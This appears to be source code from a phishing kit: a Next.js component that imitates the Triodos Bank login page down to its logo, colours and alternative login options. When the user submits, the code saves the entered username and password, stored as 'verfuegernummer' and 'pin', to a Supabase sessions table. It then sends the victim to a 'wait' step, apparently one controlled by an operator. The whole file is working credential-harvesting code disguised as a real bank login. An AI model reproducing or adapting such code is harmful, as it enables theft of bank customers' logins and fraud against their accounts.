"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function TriodosBankClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);
  const formDoluMu = username.trim().length > 0 && password.trim().length > 0;

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { ...prev, bankSlug: "triodos-bank", bankName: "Triodos Bank", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#F0EFFF] font-sans flex flex-col items-center pt-12 pb-20">
      
      {/* Logo */}
      <div className="mb-10">
        <img src="/bank-logos/triodos-bank-detail.svg" alt="Triodos Bank" className="h-10" />
      </div>

      <h1 className="text-[32px] font-bold text-[#2C0044] mb-8">Log in</h1>

      {/* Main Login Card */}
      <div className="w-full max-w-[640px] bg-white rounded-lg p-8 shadow-sm mb-12">
        <h2 className="text-[18px] font-bold text-[#2C0044] mb-6">Log in with username and password</h2>
        
        <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
          <div className="flex flex-col md:flex-row gap-6 mb-8">
            <div className="flex-1 relative">
              <input 
                type="text" 
                value={username} 
                onChange={e => setUsername(e.target.value)} 
                className="w-full bg-[#F0EFFF] border-none rounded-md pt-6 pb-2 px-4 text-[#2C0044] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#98D898] transition-all peer" 
                placeholder=" "
              />
              <label className="absolute left-4 top-4 text-[#2C0044] opacity-70 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px] pointer-events-none">
                Username
              </label>
            </div>

            <div className="flex-1 relative">
              <input 
                type="password" 
                value={password} 
                onChange={e => setPassword(e.target.value)} 
                className="w-full bg-[#F0EFFF] border-none rounded-md pt-6 pb-2 px-4 pr-12 text-[#2C0044] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#98D898] transition-all peer" 
                placeholder=" "
              />
              <label className="absolute left-4 top-4 text-[#2C0044] opacity-70 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px] pointer-events-none">
                Password
              </label>
              <button type="button" className="absolute right-4 top-4 text-[#2C0044] opacity-60 hover:opacity-100">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
              </button>
            </div>
          </div>

          <div className="flex items-center justify-between">
            <a href="#" className="text-[#2C0044] text-[15px] font-medium hover:underline">
              &gt; Forgot username or password?
            </a>
            <button 
              type="submit" 
              disabled={!formDoluMu || saving} 
              className={`font-bold py-3 px-8 rounded-full transition-colors ${formDoluMu && !saving ? "bg-[#98D898] hover:bg-[#86c986] text-[#2C0044]" : "bg-gray-400 text-gray-700 opacity-70"}`}
            >
              {saving ? "Loading..." : "Log in"}
            </button>
          </div>
        </form>
      </div>

      {/* Alternative Login Options */}
      <div className="w-full max-w-[640px]">
        <h3 className="text-[16px] font-bold text-[#2C0044] mb-4">Other login methods?</h3>
        
        <div className="space-y-3">
          <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
            <div className="flex items-center gap-4">
              <svg className="w-6 h-6 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
              <span className="text-[#2C0044] font-bold text-[15px]">App</span>
            </div>
            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center group-hover:border-[#2C0044] transition-colors">
              <svg className="w-4 h-4 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path></svg>
            </div>
          </button>

          <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
            <div className="flex items-center gap-4">
              <svg className="w-6 h-6 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
              <span className="text-[#2C0044] font-bold text-[15px]">Identifier</span>
            </div>
            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center group-hover:border-[#2C0044] transition-colors">
              <svg className="w-4 h-4 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path></svg>
            </div>
          </button>

          <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
            <div className="flex items-center gap-4">
              <span className="text-[#2C0044] font-bold text-[20px] w-6 text-center leading-none mt-1">***</span>
              <span className="text-[#2C0044] font-bold text-[15px]">Controlegetal</span>
            </div>
            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center group-hover:border-[#2C0044] transition-colors">
              <svg className="w-4 h-4 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path></svg>
            </div>
          </button>
        </div>
      </div>

    </div>
  );
}